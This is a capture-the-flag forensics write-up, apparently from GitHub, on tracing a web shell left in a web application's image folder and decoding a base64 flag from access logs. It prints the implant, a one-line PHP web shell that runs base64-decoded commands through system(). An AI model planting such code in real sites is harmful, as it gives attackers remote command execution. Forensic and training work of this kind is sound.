# Infinity Shell
## Challenge
Cipher’s legion of bots has exploited a known vulnerability in our web application, leaving behind a dangerous web shell implant. Investigate the breach and trace the attacker's footsteps!

## Solution
It is said that the cipher's legion of bots left a dangerous web shell implant. Exploring the /var/www/html folder we found a shoulder containing the web application mentioned in the statement. 

![image](https://github.com/user-attachments/assets/f3b95e61-b223-4f6b-88c0-3170c11764ce)

This site, probably contained some kind of field to insert files without checking them. Probably, cipher abused this... We checked the img folder and found a suspicious file called images.php with following code:

```php
<?php system(base64_decode($_GET['query'])); ?>
```

This file is wierd. First is using system() function and is in the middle of the images. At the time we were clueless about this file, probably was being used by the site to get images, but using base64_decode was strange.

After a bit of investigation, we found nothing. If the attacker uploaded a malicious file, he probably used it as a web shell. So we checked the logs. After a bit of searching we found the following:

![image](https://github.com/user-attachments/assets/0ee2de01-4501-4eec-9390-ba07d51fe23c)

We opened the last file in hope for access logs by this actors. And we found something!

![Untitled design(1)](https://github.com/user-attachments/assets/2f05ab11-a24f-4efc-828a-7c37973e26cd)

The line 81 looked promising. A string encoded in base64.

```base64
ZWNoby---------------------------Gx9Jwo=
```

Decoding it we can obtain the flag!

Note: This could be done using cat and then filtering the entries and was much easier.
